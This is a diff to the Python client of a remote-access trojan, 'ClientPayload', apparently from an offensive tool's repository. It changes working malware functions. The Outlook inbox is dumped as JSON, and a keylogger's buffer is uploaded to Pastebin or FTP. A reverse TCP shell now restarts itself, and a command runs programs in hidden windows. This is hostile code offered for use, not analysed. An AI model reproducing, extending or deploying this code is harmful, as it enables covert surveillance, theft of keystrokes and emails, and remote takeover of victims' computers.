@@ -672,15 +672,9 @@ class ClientPayload(object):
             inbox   = outlook.GetDefaultFolder(6)
             emails  = self._get_emails_as_json(inbox.Items)
             if len(emails):
-                output = OrderedDict()
-                for k, v in emails.items():
-                    if len(json.dumps(output, indent=2)) < 2000:
-                        output[k] = v
-                    else:
-                        return json.dumps(output, indent=2) + '\ncontinued...'
-                return json.dumps(output, indent=2)
+                return json.dumps(emails, indent=2)
             else:
-                return "No unread messages"
+                return "No emails in Outlook inbox"
         except Exception as e:
             e = "{} error: {}".format(self._email_read.func_name, str(e))
             self.debug(e)
@@ -696,8 +690,7 @@ class ClientPayload(object):
             for k,v in emails.items():
                 if string not in v.get('message') and string not in v.get('subject') and string not in v.get('from'):
                     emails.pop(k,v)
-                return json.dumps(output, indent=2) if len(json.dumps(output)) < 2000 else json.dumps(emails, indent=2)[:1984]+ ' ...\n(continued)'
-            return json.dumps(output, indent=2)
+            return json.dumps(emails, indent=2)
         except Exception as e:
             e = "{} error: {}".format(self._email_search.func_name, str(e))
             self.debug(e)
@@ -710,7 +703,7 @@ class ClientPayload(object):
             outlook = Dispatch('Outlook.Application').GetNameSpace('MAPI')
             inbox   = outlook.GetDefaultFolder(6)
             emails  = inbox.Items
-            return "\n\tEmails in Outlook inbox: %d\n\tEmails dumped from Outlook inbox: %d" % (len(emails), int(self.email.inbox.unfinished_tasks))
+            return "\n\tEmails in Outlook inbox: %d" % len(emails)
         except Exception as e:
             e = "{} error: {}".format(self._email_search.func_name, str(e))
             self.debug(e)
@@ -734,7 +727,10 @@ class ClientPayload(object):
 
     def _keylogger_status(self,  *args, **kwargs):
         try:
-            return "Keylogger\n\tmode: {}\n\ttime: {}\n\tsize: {} bytes".format(ClientPayload.keylogger.mode, self._get_job_status(float(self._workers['keylogger'].name)), ClientPayload.keylogger.buffer.tell())
+            mode    = 'running' if 'keylogger' in self._workers else 'stopped'
+            status  = self._get_job_status(float(m._workers['keylogger'].name))
+            length  = self.keylogger.buffer.tell()
+            return "Status\n\tjob: {}\n\tmode: {}\n\ttime: {}\n\tsize: {} bytes".format(self.keylogger.func_name, mode, status, length)
         except Exception as e:
             self.debug('{} error: {}'.format(self._keylogger_status.func_name, str(e)))
     
@@ -742,17 +738,18 @@ class ClientPayload(object):
     def _keylogger_manager(self, *args, **kwargs):
         while True:
             try:
-                if ClientPayload.keylogger.buffer.tell() > ClientPayload.keylogger.max_bytes:
-                    result  = self._upload_pastebin(ClientPayload.keylogger.buffer) if 'ftp' not in args else self._upload_ftp(ClientPayload.keylogger.buffer, filetype='.txt')
+                if self.keylogger.buffer.tell() > self.keylogger.max_bytes:
+                    result  = self._upload_pastebin(self.keylogger.buffer) if 'ftp' not in args else self._upload_ftp(self.keylogger.buffer, filetype='.txt')
                     task_id = self._task_id(self.keylogger.func_name)
                     task    = {'task': task_id, 'session': self._session['id'], 'client': self._sysinfo['id'], 'command': self.keylogger.func_name, 'result': result}
                     self._results[task_id] = task
-                    ClientPayload.keylogger.buffer.reset()
+                    self.keylogger.buffer.reset()
                 else:
                     time.sleep(5)
             except Exception as e:
                 self.debug("{} error: {}".format(self._keylogger_manager.func_name, str(e)))
                 break
+
 
     def _keylogger_event(self, event):
         try:
@@ -1563,9 +1560,9 @@ class ClientPayload(object):
                                 self._workers['keylogger_manager'] = threading.Thread(target=self._keylogger_manager, name=time.time())
                                 self._workers['keylogger_manager'].daemon = True
                                 self._workers['keylogger_manager'].start()
-                            elif 'ReverseShell' in task:
-                                self._workers['ReverseShell'] = threading.Thread(target=self.reverse_tcp_shell, name=time.time())
-                                self._workers['ReverseShell'].start()    
+                            elif self.reverse_tcp_shell.func_name in task:
+                                self._workers[self.reverse_tcp_shell.func_name] = threading.Thread(target=self.reverse_tcp_shell, name=time.time())
+                                self._workers[self.reverse_tcp_shell.func_name].start()    
                     time.sleep(2)
             self.kill()
             sys.exit()
@@ -1900,24 +1897,30 @@ class ClientPayload(object):
             self._session['connection'].clear()
             self._session['prompt'].clear()
         except Exception as e:
-            self.debug("{} error: {}".format(self.kill.func_name, str(e))) if debug else None
+            self.debug("{} error: {}".format(self.kill.func_name, str(e)))
         try:
             self._session.get('socket').close()
         except Exception as e:
-            self.debug("{} error: {}".format(self.kill.func_name, str(e))) if debug else None
+            self.debug("{} error: {}".format(self.kill.func_name, str(e)))
         try:
+            _ = self._session.pop('socket', None)
+            del _
+        except Exception as e:
+            self.debug("{} error: {}".format(self.kill.func_name, str(e)))
+        try:
+            self._session['socket']      = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             self._session['id']          = str()
             self._session['key']         = str()
             self._session['public_key']  = str()
         except Exception as e:
-            self.debug("{} error: {}".format(self.kill.func_name, str(e))) if debug else None
+            self.debug("{} error: {}".format(self.kill.func_name, str(e)))
         try:
             jobs = self._workers.keys()
             for job in jobs:
                 _ = self._workers.pop(job, None)
                 del _
         except Exception as e:
-            self.debug("{} error: {}".format(self.kill.func_name, str(e))) if debug else None
+            self.debug("{} error: {}".format(self.kill.func_name, str(e)))
 
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='help')
@@ -2199,22 +2202,24 @@ class ClientPayload(object):
             self.debug("{} error: '{}'".format(self.escalate.func_name, str(e)))
 
 
-    @config(platforms=['win32','linux2','darwin'], process_list={}, command=True, usage='execute <path>')
-    def execute(self, path):
+    @config(platforms=['win32','linux2','darwin'], process_list={}, command=True, usage='execute <path> [args]')
+    def execute(self, args):
         """
         run an executable program in a hidden process
         """
+        path, args = [i.strip() for i in args.split('"') if i if not i.isspace()] if args.count('"') == 2 else [i for i in args.partition(' ') if i if not i.isspace()]
+        args = [path] + args.split()
         if os.path.isfile(path):
             name = os.path.splitext(os.path.basename(path))[0]
             try:
                 info = subprocess.STARTUPINFO()
                 info.dwFlags = subprocess.STARTF_USESHOWWINDOW | subprocess.CREATE_NEW_PROCESS_GROUP
                 info.wShowWindow = subprocess.SW_HIDE
-                self.execute.process_list[name] = subprocess.Popen(path, startupinfo=info)
+                self.execute.process_list[name] = subprocess.Popen(args, startupinfo=info)
                 return "Running '{}' in a hidden process".format(path)
             except Exception as e:
                 try:
-                    self.execute.process_list[name] = subprocess.Popen(path, 0, None, None, subprocess.PIPE, subprocess.PIPE)
+                    self.execute.process_list[name] = subprocess.Popen(args, 0, None, None, subprocess.PIPE, subprocess.PIPE)
                     return "Running '{}' in a new process".format(name)
                 except Exception as e:
                     self.debug("{} error: {}".format(self.execute.func_name, str(e)))
@@ -2222,14 +2227,15 @@ class ClientPayload(object):
             return "File '{}' not found".format(str(path))
 
 
-    @config(platforms=['win32','linux2','darwin'], mode='stop', max_bytes=4000, buffer=cStringIO.StringIO(), window=None, command=True, usage='keylogger <start/stop/dump>')
-    def keylogger(self, mode=None):
+    @config(platforms=['win32','linux2','darwin'], max_bytes=4000, buffer=cStringIO.StringIO(), window=None, command=True, usage='keylogger <start/stop/dump>')
+    def keylogger(self, *args, **kwargs):
         """
         start/stop/dump the keylogger
         """
+        mode = args[0] if args else None
         if not mode:                                                                                                                                                                                                                                                                                             
             if self.keylogger.func_name not in self._workers:
-                return ClientPayload.keylogger.usage
+                return self.keylogger.usage
             else:
                 return self._keylogger_status()
         else:
@@ -2238,10 +2244,8 @@ class ClientPayload(object):
                     self._workers[self.keylogger.func_name] = threading.Thread(target=self._keylogger, name=time.time())
                     self._workers[self.keylogger.func_name].setDaemon(True)
                     self._workers[self.keylogger.func_name].start()
-                    ClientPayload.keylogger.mode = 'running'
                     return self._keylogger_status()
                 else:
-                    ClientPayload.keylogger.mode = 'running'
                     return self._keylogger_status()
             elif 'stop' in mode:
                 try:
@@ -2250,22 +2254,20 @@ class ClientPayload(object):
                 try:
                     self.stop(self._keylogger_manager.func_name)
                 except: pass
-                ClientPayload.keylogger.mode = 'stopped'
                 return self._keylogger_status()
             elif 'auto' in mode:
                 self._workers[self._keylogger_manager.func_name] = threading.Thread(target=self._keylogger_manager, name=time.time())
                 self._workers[self._keylogger_manager.func_name].setDaemon(True)
                 self._workers[self._keylogger_manager.func_name].start()
-                ClientPayload.keylogger.mode = 'running'
                 return self._keylogger_status()
             elif 'dump' in mode:
                 result = self._upload_pastebin(self.keylogger.buffer) if not 'ftp' in mode else self._upload_ftp(self.keylogger.buffer)
-                ClientPayload.keylogger.buffer.reset()
+                self.keylogger.buffer.reset()
                 return result
             elif 'status' in mode:
                 return self._keylogger_status()
             else:
-                return ClientPayload.keylogger.usage
+                return self.keylogger.usage
 
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='screenshot [mode]')
@@ -2390,14 +2392,15 @@ class ClientPayload(object):
                                 if cmd in ClientPayload._config['tasks'] and 'PRIVATE KEY' not in task['command']:
                                     self._results[task['task']] = task
                                 self._server_send(**task)
-                        self._session['prompt'].set()
+                            self._session['prompt'].set()
                 else:        
-                    self.debug("{} stopped. Restarting in 5 seconds...".format('ReverseShell'))
-                    self.kill()
+                    self.debug("{} stopped. Restarting in 5 seconds...".format(self.reverse_tcp_shell.func_name))
                     break
         except Exception as e:
-            self.debug("{} error: '{}'".format('ReverseShell', str(e)))
-            self.kill()
+            self.debug("{} error: '{}'".format(self.reverse_tcp_shell.func_name, str(e)))
+        self.kill()
+        time.sleep(5)
+        self.run()
 
 
     @staticmethod
@@ -2436,14 +2439,14 @@ class ClientPayload(object):
         try:
             self.connect(*args, **kwargs)
             if self._session['connection'].wait(timeout=3.0):
-                self._workers['Shell_Prompt'] = threading.Thread(target=self._server_prompt, name=time.time())
-                self._workers['Task_Manager'] = threading.Thread(target=self._task_manager, name=time.time())
-                self._workers['ReverseShell'] = threading.Thread(target=self.reverse_tcp_shell, name=time.time())
-                self._workers['Shell_Prompt'].daemon = True
-                self._workers['Task_Manager'].daemon = True
-                self._workers['Shell_Prompt'].start()
-                self._workers['ReverseShell'].start()
-                self._workers['Task_Manager'].start()
+                self._workers[self._server_prompt.func_name] = threading.Thread(target=self._server_prompt, name=time.time())
+                self._workers[self._task_manager.func_name] = threading.Thread(target=self._task_manager, name=time.time())
+                self._workers[self.reverse_tcp_shell.func_name] = threading.Thread(target=self.reverse_tcp_shell, name=time.time())
+                self._workers[self._server_prompt.func_name].daemon = True
+                self._workers[self._task_manager.func_name].daemon = True
+                self._workers[self._server_prompt.func_name].start()
+                self._workers[self.reverse_tcp_shell.func_name].start()
+                self._workers[self._task_manager.func_name].start()
             else:
                 self.debug("Connection failed - restarting in 5 seconds...")
                 self.kill()
